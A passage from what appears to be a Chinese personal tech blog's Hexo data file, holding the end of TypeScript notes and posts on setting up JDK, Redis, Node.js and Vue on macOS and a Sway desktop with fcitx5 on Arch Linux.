class=\"keyword\">extends</span> <span class=\"title class_\">Animal</span>&gt;(<span class=\"attr\">c</span>: <span class=\"keyword\">new</span> () =&gt; A): A &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title function_\">c</span>()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">createInstance</span>(<span class=\"title class_\">Lion</span>).<span class=\"property\">keeper</span>.<span class=\"property\">nametag</span> <span class=\"comment\">// typechecks!</span></span><br><span class=\"line\"><span class=\"title function_\">createInstance</span>(<span class=\"title class_\">Bee</span>).<span class=\"property\">keeper</span>.<span class=\"property\">hasMask</span> <span class=\"comment\">// typechecks!</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"枚举-enum\"><a href=\"#枚举-enum\" class=\"headerlink\" title=\"枚举 - enum\"></a>枚举 - enum</h1><p>使用枚举我们可以定义一些有名字的数字常量。枚举通过 <code>enum</code> 关键字来定义。</p>\n<p>枚举是在运行时真正存在的一个对象。其中一个原因是因为这样可以从枚举值到枚举名进行反向映射。生成的代码中，枚举类型被编译成一个对象，它包含双向映射（name -&gt; value）和（value -&gt; name）。 引用枚举成员总会生成一次属性访问并且永远不会内联。</p>\n<p>当访问枚举值时，为了避免生成多余的代码和间接引用，可以使用常数枚举，在 <code>enum</code> 关键字前使用 <code>const</code> 修饰符。常数枚举不可能有计算成员。</p>\n<p>外部枚举用来描述已经存在的枚举类型的形状。外部枚举和非外部枚举之间有一个重要的区别，在正常的枚举里，没有初始化方法的成员被当成常数成员。对于非常数的外部枚举而言，没有初始化方法时被当做需要经过计算的。</p>\n<h1 id=\"类型推论-type-inference\"><a href=\"#类型推论-type-inference\" class=\"headerlink\" title=\"类型推论 - type inference\"></a>类型推论 - type inference</h1><p>当需要从几个表达式中推断类型时候，会使用这些表达式的类型来推断出一个最合适的通用类型。如果没有找到最佳通用类型的话，类型推断的结果为联合数组类型。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/99343202\">优雅的在 vue 中使用 TypeScript</a></li>\n</ul>"},{"title":"macOS开发环境搭建","date":"2021-06-05T01:00:00.000Z","_content":"\n这里记录一些开发软件的安装配置，推荐先安装好 Homebrew，简单省事。\n\n<!--more-->\n\n# Java 环境搭建\n\n1. 安装 AdoptOpenJDK 11\n\n   ```bash\n   brew install AdoptOpenJDK/openjdk/adoptopenjdk11\n   ```\n\n2. 查看安装的 JDK 信息\n\n   ```bash\n   # 查看Java版本\n   java -version\n   # 查看JDK安装路径\n   /usr/libexec/java_home -V\n   ```\n\n   注：homebrew 下载的 openjdk 安装目录是`/usr/local/opt/openjdk-xx`，AdoptOpenJDK 安装目录是`/Library/Java/JavaVirtualMachines/adoptopenjdk-xx`\n\n3. 参考文章\n\n   [macOS 所有版本 JDK 安装指南 (with Homebrew)](https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html)\n\n# Redis\n\n1. Homebrew 安装 Redis\n\n   ```bash\n   brew install redis\n   ```\n\n2. 查看安装及配置文件位置\n\n   > Homebrew 安装的软件会默认在`/usr/local/Cellar/`路径下\n   >\n   > redis 的配置文件`redis.conf`存放在`/usr/local/etc`路径下\n\n3. 启动 redis\n\n   ```bash\n   # 方式一：使用brew帮助我们启动软件\n   brew services start redis\n   # 方式二：\n   redis-server\n   ## 使用某个配置文件启动\n   redis-server /usr/local/etc/redis.conf\n   ```\n\n4. 查看 redis 服务进程\n\n   ```bash\n   # 通过以下命令查看redis服务是否正在运行\n   ps axu | grep redis\n   ```\n\n5. redis-cli\n\n   ```bash\n   # 启动 redis 客户端，打开终端并输入输入以下命令即可连接本地的 redis 服务\n   redis-cli\n   # redis 默认端口号6379，默认 auth 为空，可用如下命令指定 host 和 port 连接 redis\n   redis-cli -h 127.0.0.1 -p 6379\n   ```\n\n   注：连接后可执行 **PING** 命令，该命令用于检测 redis 服务是否启动，返回 **PONG**\n\n6. 关闭 redis 服务\n\n   ```bash\n   # 发送 shutdown 命令关闭 redis --right way\n   redis-cli shutdown\n   # 强行终止 redis 服务\n   sudo pkill redis-server\n   ```\n\n# Node.js\n\n1. 安装\n\n   ```bash\n   # 安装 nodejs\n   brew install nodejs\n   ```\n\n2. 查看安装的 node.js 信息\n\n   ```bash\n   # 查看node版本\n   node -v\n   # 查看npm版本号\n   npm -v\n   # 更新npm版本(安装nodejs时自动安装，当有更新时需手动更新)\n   npm -g install npm\n   ```\n\n# Vue\n\n1. 安装 vue\n\n   ```bash\n   # 全局安装vue-cli\n   npm install -g @vue/cli\n   ```\n\n2. uniapp 项目\n\n   ```bash\n   # 创建uni-app 正式版\n   vue create -p dcloudio/uni-preset-vue my-project\n   # 创建uni-app alpha版\n   vue create -p dcloudio/uni-preset-vue#alpha my-alpha-project\n\n   # 运行、发布uni-app，%PLATFORM%取值：mp-weixin 为微信小程序，h5为H5，mp-alipay为支付宝小程序，更多请见官网\n   npm run dev:%PLATFORM%\n   npm run build:%PLATFORM%\n   ```\n\n   [uni-app 官网 (dcloud.io)](https://uniapp.dcloud.io)\n","source":"_posts/2021/06/macOS开发环境搭建.md","raw":"---\ntitle: macOS开发环境搭建\ndate: 2021-06-05 09:00:00\ntags:\n  - 配置\n  - macOS\ncategories:\n  - 配置\n  - macOS\n---\n\n这里记录一些开发软件的安装配置，推荐先安装好 Homebrew，简单省事。\n\n<!--more-->\n\n# Java 环境搭建\n\n1. 安装 AdoptOpenJDK 11\n\n   ```bash\n   brew install AdoptOpenJDK/openjdk/adoptopenjdk11\n   ```\n\n2. 查看安装的 JDK 信息\n\n   ```bash\n   # 查看Java版本\n   java -version\n   # 查看JDK安装路径\n   /usr/libexec/java_home -V\n   ```\n\n   注：homebrew 下载的 openjdk 安装目录是`/usr/local/opt/openjdk-xx`，AdoptOpenJDK 安装目录是`/Library/Java/JavaVirtualMachines/adoptopenjdk-xx`\n\n3. 参考文章\n\n   [macOS 所有版本 JDK 安装指南 (with Homebrew)](https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html)\n\n# Redis\n\n1. Homebrew 安装 Redis\n\n   ```bash\n   brew install redis\n   ```\n\n2. 查看安装及配置文件位置\n\n   > Homebrew 安装的软件会默认在`/usr/local/Cellar/`路径下\n   >\n   > redis 的配置文件`redis.conf`存放在`/usr/local/etc`路径下\n\n3. 启动 redis\n\n   ```bash\n   # 方式一：使用brew帮助我们启动软件\n   brew services start redis\n   # 方式二：\n   redis-server\n   ## 使用某个配置文件启动\n   redis-server /usr/local/etc/redis.conf\n   ```\n\n4. 查看 redis 服务进程\n\n   ```bash\n   # 通过以下命令查看redis服务是否正在运行\n   ps axu | grep redis\n   ```\n\n5. redis-cli\n\n   ```bash\n   # 启动 redis 客户端，打开终端并输入输入以下命令即可连接本地的 redis 服务\n   redis-cli\n   # redis 默认端口号6379，默认 auth 为空，可用如下命令指定 host 和 port 连接 redis\n   redis-cli -h 127.0.0.1 -p 6379\n   ```\n\n   注：连接后可执行 **PING** 命令，该命令用于检测 redis 服务是否启动，返回 **PONG**\n\n6. 关闭 redis 服务\n\n   ```bash\n   # 发送 shutdown 命令关闭 redis --right way\n   redis-cli shutdown\n   # 强行终止 redis 服务\n   sudo pkill redis-server\n   ```\n\n# Node.js\n\n1. 安装\n\n   ```bash\n   # 安装 nodejs\n   brew install nodejs\n   ```\n\n2. 查看安装的 node.js 信息\n\n   ```bash\n   # 查看node版本\n   node -v\n   # 查看npm版本号\n   npm -v\n   # 更新npm版本(安装nodejs时自动安装，当有更新时需手动更新)\n   npm -g install npm\n   ```\n\n# Vue\n\n1. 安装 vue\n\n   ```bash\n   # 全局安装vue-cli\n   npm install -g @vue/cli\n   ```\n\n2. uniapp 项目\n\n   ```bash\n   # 创建uni-app 正式版\n   vue create -p dcloudio/uni-preset-vue my-project\n   # 创建uni-app alpha版\n   vue create -p dcloudio/uni-preset-vue#alpha my-alpha-project\n\n   # 运行、发布uni-app，%PLATFORM%取值：mp-weixin 为微信小程序，h5为H5，mp-alipay为支付宝小程序，更多请见官网\n   npm run dev:%PLATFORM%\n   npm run build:%PLATFORM%\n   ```\n\n   [uni-app 官网 (dcloud.io)](https://uniapp.dcloud.io)\n","slug":"2021/06/macOS开发环境搭建","published":1,"updated":"2022-09-26T15:04:34.029Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciz000izge39u7kccuz","content":"<p>这里记录一些开发软件的安装配置，推荐先安装好 Homebrew，简单省事。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Java-环境搭建\"><a href=\"#Java-环境搭建\" class=\"headerlink\" title=\"Java 环境搭建\"></a>Java 环境搭建</h1><ol>\n<li><p>安装 AdoptOpenJDK 11</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install AdoptOpenJDK/openjdk/adoptopenjdk11</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看安装的 JDK 信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看Java版本</span></span><br><span class=\"line\">java -version</span><br><span class=\"line\"><span class=\"comment\"># 查看JDK安装路径</span></span><br><span class=\"line\">/usr/libexec/java_home -V</span><br></pre></td></tr></table></figure>\n\n<p>注：homebrew 下载的 openjdk 安装目录是<code>/usr/local/opt/openjdk-xx</code>，AdoptOpenJDK 安装目录是<code>/Library/Java/JavaVirtualMachines/adoptopenjdk-xx</code></p>\n</li>\n<li><p>参考文章</p>\n<p><a href=\"https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html\">macOS 所有版本 JDK 安装指南 (with Homebrew)</a></p>\n</li>\n</ol>\n<h1 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h1><ol>\n<li><p>Homebrew 安装 Redis</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install redis</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看安装及配置文件位置</p>\n<blockquote>\n<p>Homebrew 安装的软件会默认在<code>/usr/local/Cellar/</code>路径下</p>\n<p>redis 的配置文件<code>redis.conf</code>存放在<code>/usr/local/etc</code>路径下</p>\n</blockquote>\n</li>\n<li><p>启动 redis</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 方式一：使用brew帮助我们启动软件</span></span><br><span class=\"line\">brew services start redis</span><br><span class=\"line\"><span class=\"comment\"># 方式二：</span></span><br><span class=\"line\">redis-server</span><br><span class=\"line\"><span class=\"comment\">## 使用某个配置文件启动</span></span><br><span class=\"line\">redis-server /usr/local/etc/redis.conf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看 redis 服务进程</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 通过以下命令查看redis服务是否正在运行</span></span><br><span class=\"line\">ps axu | grep redis</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>redis-cli</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动 redis 客户端，打开终端并输入输入以下命令即可连接本地的 redis 服务</span></span><br><span class=\"line\">redis-cli</span><br><span class=\"line\"><span class=\"comment\"># redis 默认端口号6379，默认 auth 为空，可用如下命令指定 host 和 port 连接 redis</span></span><br><span class=\"line\">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>\n\n<p>注：连接后可执行 <strong>PING</strong> 命令，该命令用于检测 redis 服务是否启动，返回 <strong>PONG</strong></p>\n</li>\n<li><p>关闭 redis 服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 发送 shutdown 命令关闭 redis --right way</span></span><br><span class=\"line\">redis-cli shutdown</span><br><span class=\"line\"><span class=\"comment\"># 强行终止 redis 服务</span></span><br><span class=\"line\">sudo pkill redis-server</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h1><ol>\n<li><p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 nodejs</span></span><br><span class=\"line\">brew install nodejs</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看安装的 node.js 信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看node版本</span></span><br><span class=\"line\">node -v</span><br><span class=\"line\"><span class=\"comment\"># 查看npm版本号</span></span><br><span class=\"line\">npm -v</span><br><span class=\"line\"><span class=\"comment\"># 更新npm版本(安装nodejs时自动安装，当有更新时需手动更新)</span></span><br><span class=\"line\">npm -g install npm</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"Vue\"><a href=\"#Vue\" class=\"headerlink\" title=\"Vue\"></a>Vue</h1><ol>\n<li><p>安装 vue</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 全局安装vue-cli</span></span><br><span class=\"line\">npm install -g @vue/cli</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>uniapp 项目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建uni-app 正式版</span></span><br><span class=\"line\">vue create -p dcloudio/uni-preset-vue my-project</span><br><span class=\"line\"><span class=\"comment\"># 创建uni-app alpha版</span></span><br><span class=\"line\">vue create -p dcloudio/uni-preset-vue<span class=\"comment\">#alpha my-alpha-project</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行、发布uni-app，%PLATFORM%取值：mp-weixin 为微信小程序，h5为H5，mp-alipay为支付宝小程序，更多请见官网</span></span><br><span class=\"line\">npm run dev:%PLATFORM%</span><br><span class=\"line\">npm run build:%PLATFORM%</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://uniapp.dcloud.io/\">uni-app 官网 (dcloud.io)</a></p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>这里记录一些开发软件的安装配置，推荐先安装好 Homebrew，简单省事。</p>","more":"<h1 id=\"Java-环境搭建\"><a href=\"#Java-环境搭建\" class=\"headerlink\" title=\"Java 环境搭建\"></a>Java 环境搭建</h1><ol>\n<li><p>安装 AdoptOpenJDK 11</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install AdoptOpenJDK/openjdk/adoptopenjdk11</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看安装的 JDK 信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看Java版本</span></span><br><span class=\"line\">java -version</span><br><span class=\"line\"><span class=\"comment\"># 查看JDK安装路径</span></span><br><span class=\"line\">/usr/libexec/java_home -V</span><br></pre></td></tr></table></figure>\n\n<p>注：homebrew 下载的 openjdk 安装目录是<code>/usr/local/opt/openjdk-xx</code>，AdoptOpenJDK 安装目录是<code>/Library/Java/JavaVirtualMachines/adoptopenjdk-xx</code></p>\n</li>\n<li><p>参考文章</p>\n<p><a href=\"https://www.cnblogs.com/imzhizi/p/macos-jdk-installation-homebrew.html\">macOS 所有版本 JDK 安装指南 (with Homebrew)</a></p>\n</li>\n</ol>\n<h1 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h1><ol>\n<li><p>Homebrew 安装 Redis</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install redis</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看安装及配置文件位置</p>\n<blockquote>\n<p>Homebrew 安装的软件会默认在<code>/usr/local/Cellar/</code>路径下</p>\n<p>redis 的配置文件<code>redis.conf</code>存放在<code>/usr/local/etc</code>路径下</p>\n</blockquote>\n</li>\n<li><p>启动 redis</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 方式一：使用brew帮助我们启动软件</span></span><br><span class=\"line\">brew services start redis</span><br><span class=\"line\"><span class=\"comment\"># 方式二：</span></span><br><span class=\"line\">redis-server</span><br><span class=\"line\"><span class=\"comment\">## 使用某个配置文件启动</span></span><br><span class=\"line\">redis-server /usr/local/etc/redis.conf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看 redis 服务进程</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 通过以下命令查看redis服务是否正在运行</span></span><br><span class=\"line\">ps axu | grep redis</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>redis-cli</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动 redis 客户端，打开终端并输入输入以下命令即可连接本地的 redis 服务</span></span><br><span class=\"line\">redis-cli</span><br><span class=\"line\"><span class=\"comment\"># redis 默认端口号6379，默认 auth 为空，可用如下命令指定 host 和 port 连接 redis</span></span><br><span class=\"line\">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>\n\n<p>注：连接后可执行 <strong>PING</strong> 命令，该命令用于检测 redis 服务是否启动，返回 <strong>PONG</strong></p>\n</li>\n<li><p>关闭 redis 服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 发送 shutdown 命令关闭 redis --right way</span></span><br><span class=\"line\">redis-cli shutdown</span><br><span class=\"line\"><span class=\"comment\"># 强行终止 redis 服务</span></span><br><span class=\"line\">sudo pkill redis-server</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h1><ol>\n<li><p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装 nodejs</span></span><br><span class=\"line\">brew install nodejs</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看安装的 node.js 信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看node版本</span></span><br><span class=\"line\">node -v</span><br><span class=\"line\"><span class=\"comment\"># 查看npm版本号</span></span><br><span class=\"line\">npm -v</span><br><span class=\"line\"><span class=\"comment\"># 更新npm版本(安装nodejs时自动安装，当有更新时需手动更新)</span></span><br><span class=\"line\">npm -g install npm</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"Vue\"><a href=\"#Vue\" class=\"headerlink\" title=\"Vue\"></a>Vue</h1><ol>\n<li><p>安装 vue</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 全局安装vue-cli</span></span><br><span class=\"line\">npm install -g @vue/cli</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>uniapp 项目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建uni-app 正式版</span></span><br><span class=\"line\">vue create -p dcloudio/uni-preset-vue my-project</span><br><span class=\"line\"><span class=\"comment\"># 创建uni-app alpha版</span></span><br><span class=\"line\">vue create -p dcloudio/uni-preset-vue<span class=\"comment\">#alpha my-alpha-project</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 运行、发布uni-app，%PLATFORM%取值：mp-weixin 为微信小程序，h5为H5，mp-alipay为支付宝小程序，更多请见官网</span></span><br><span class=\"line\">npm run dev:%PLATFORM%</span><br><span class=\"line\">npm run build:%PLATFORM%</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://uniapp.dcloud.io/\">uni-app 官网 (dcloud.io)</a></p>\n</li>\n</ol>"},{"layout":"pages","title":"ArchLinux使用Sway桌面","date":"2023-06-18T13:57:36.000Z","_content":"\n我的 ManjaroToGo 在一次更新后 grub 可能是坏了，找不到启动盘，使用镜像 chroot 尝试修复了好几次都不行，重装切换成 archlinux 算了，再一想，没尝试过平铺式桌面，而且现在的 wayland 也似乎能用了，所以直接装 archlinux+sway。\n\n没错，我天天折腾没用的东西。\n\n<!-- more -->\n\n# 安装系统\n\n没什么好说的，网上教程很多，照着教程一步步配置就好，但是我想装的是 linuxToGo，所以 grub 引导写入的命令要加上 `--removable` 选项，我也是装了好几次最后都不能在 U 盘启动才知道这个问题。\n\n# 安装 SwayWM\n\n安装 sway 桌面\n\n```bash\nsudo pacman -S wlroots sway\n```\n\n配置文件设置\n\n```bash\ncp /etc/sway/config ~/.config/sway/\n\nvim ~/.config/sway/config\n```\n\n使用 vulkan 做渲染后端\n\n```bash\nvim ~/.pam_environment\n#\nWLR_RENDERER=vulkan\n```\n\n登录 tty1 自动进入 sway\n\n```bash\nvim ~/.bash_profile\n#\n[[ -f ~/.bashrc ]] && . ~/.bashrc\n[ \"$(tty)\" = \"/dev/tty1\" ] && exec sway\n```\n\nwofi 启动器和 alacritty 终端\n\n```bash\nsudo pacman -S wofi alacritty\n```\n\nwaybar 状态栏\n\n```bash\nsudo pacman -S waybar otf-font-awesome\n\nvim ~/.config/sway/config\n#\n#bar {\n#    position top\n#    swaybar_command waybar\n#}\n```\n\n# fcitx5 输入法\n\n安装\n\n```bash\nsudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-pinyin-moegirl\n```\n\n配置\n\n```bash\nvim ~/.config/sway/config\n### Auto start\nexec --no-startup-id fcitx5 -d\n\nvim ~/.pam_environment\n#\nGTK_IM_MODULE DEFAULT=fcitx\nQT_IM_MODULE  DEFAULT=fcitx\nXMODIFIERS    DEFAULT=@im=fcitx\nINPUT_METHOD  DEFAULT=fcitx\nSDL_IM_MODULE DEFAULT=fcitx\n```\n\nwps 的中文输入\n\n```bash\nsudo vim /usr/bin/wps\n# 添加如下两行\n#!/bin/bash\nexport XMODIFIERS=\"@im=fcitx\"\nexport QT_IM_MODULE=\"fcitx\"\n```\n\n# 参考文章\n\n**特别感谢各位大佬的分享记录**，让我能尝试这些新技术新玩意。\n\n- [Archlinux+Sway+Windows11 完全配置记录](https://github.com/CelestialCosmic/themeblog/issues/22)\n- [4.1 Installing GRUB using grub-install](https://www.gnu.org/software/grub/manual/grub/html_node/Installing-GRUB-using-grub_002dinstall.html#:~:text=For%20removable%20installs%20you%20have%20to%20use%20--removable,and%20--efi-directory%20%3A%20%23%20grub-install%20--efi-directory%3D%2Fmnt%2Fusb%20--boot-directory%3D%2Fmnt%2Fusb%2Fboot%20--removable)\n- [探索 linux 桌面全面 wayland 化（基于 swaywm）](https://zhuanlan.zhihu.com/p/462322143)\n- [ArchLinux 安装 fcitx5 以及拼音输入法](https://blog.csdn.net/HideOnLie/article/details/107615277)\n- [Linux：WPS 不能使用中文输入法](https://blog.csdn.net/wishchin/article/details/89674250)\n","source":"_posts/2023/06/ArchLinux使用Sway桌面.md","raw":"---\nlayout: pages\ntitle: ArchLinux使用Sway桌面\ndate: 2023-06-18 21:57:36\ntags:\n  - 配置\n  - Linux\ncategories:\n  - 配置\n  - Linux\n---\n\n我的 ManjaroToGo 在一次更新后 grub 可能是坏了，找不到启动盘，使用镜像 chroot 尝试修复了好几次都不行，重装切换成 archlinux 算了，再一想，没尝试过平铺式桌面，而且现在的 wayland 也似乎能用了，所以直接装 archlinux+sway。\n\n没错，我天天折腾没用的东西。\n\n<!-- more -->\n\n# 安装系统\n\n没什么好说的，网上教程很多，照着教程一步步配置就好，但是我想装的是 linuxToGo，所以 grub 引导写入的命令要加上 `--removable` 选项，我也是装了好几次最后都不能在 U 盘启动才知道这个问题。\n\n# 安装 SwayWM\n\n安装 sway 桌面\n\n```bash\nsudo pacman -S wlroots sway\n```\n\n配置文件设置\n\n```bash\ncp /etc/sway/config ~/.config/sway/\n\nvim ~/.config/sway/config\n```\n\n使用 vulkan 做渲染后端\n\n```bash\nvim ~/.pam_environment\n#\nWLR_RENDERER=vulkan\n```\n\n登录 tty1 自动进入 sway\n\n```bash\nvim ~/.bash_profile\n#\n[[ -f ~/.bashrc ]] && . ~/.bashrc\n[ \"$(tty)\" = \"/dev/tty1\" ] && exec sway\n```\n\nwofi 启动器和 alacritty 终端\n\n```bash\nsudo pacman -S wofi alacritty\n```\n\nwaybar 状态栏\n\n```bash\nsudo pacman -S waybar otf-font-awesome\n\nvim ~/.config/sway/config\n#\n#bar {\n#    position top\n#    swaybar_command waybar\n#}\n```\n\n# fcitx5 输入法\n\n安装\n\n```bash\nsudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-pinyin-moegirl\n```\n\n配置\n\n```bash\nvim ~/.config/sway/config\n### Auto start\nexec --no-startup-id fcitx5 -d\n\nvim ~/.pam_environment\n#\nGTK_IM_MODULE DEFAULT=fcitx\nQT_IM_MODULE  DEFAULT=fcitx\nXMODIFIERS    DEFAULT=@im=fcitx\nINPUT_METHOD  DEFAULT=fcitx\nSDL_IM_MODULE DEFAULT=fcitx\n```\n\nwps 的中文输入\n\n```bash\nsudo vim /usr/bin/wps\n# 添加如下两行\n#!/bin/bash\nexport XMODIFIERS=\"@im=fcitx\"\nexport QT_IM_MODULE=\"fcitx\"\n```\n\n# 参考文章\n\n**特别感谢各位大佬的分享记录**，让我能尝试这些新技术新玩意。\n\n- [Archlinux+Sway+Windows11 完全配置记录](https://github.com/CelestialCosmic/themeblog/issues/22)\n- [4.1 Installing GRUB using grub-install](https://www.gnu.org/software/grub/manual/grub/html_node/Installing-GRUB-using-grub_002dinstall.html#:~:text=For%20removable%20installs%20you%20have%20to%20use%20--removable,and%20--efi-directory%20%3A%20%23%20grub-install%20--efi-directory%3D%2Fmnt%2Fusb%20--boot-directory%3D%2Fmnt%2Fusb%2Fboot%20--removable)\n- [探索 linux 桌面全面 wayland 化（基于 swaywm）](https://zhuanlan.zhihu.com/p/462322143)\n- [ArchLinux 安装 fcitx5 以及拼音输入法](https://blog.csdn.net/HideOnLie/article/details/107615277)\n- [Linux：WPS 不能使用中文输入法](https://blog.csdn.net/wishchin/article/details/89674250)\n","slug":"2023/06/ArchLinux使用Sway桌面","published":1,"updated":"2023-06-23T11:13:44.786Z","comments":1,"photos":[],"link":"","_id":"clyh3xciz000jzge395jlgbze","content":"<p>我的 ManjaroToGo 在一次更新后 grub 可能是坏了，找不到启动盘，使用镜像 chroot 尝试修复了好几次都不行，重装切换成 archlinux 算了，再一想，没尝试过平铺式桌面，而且现在的 wayland 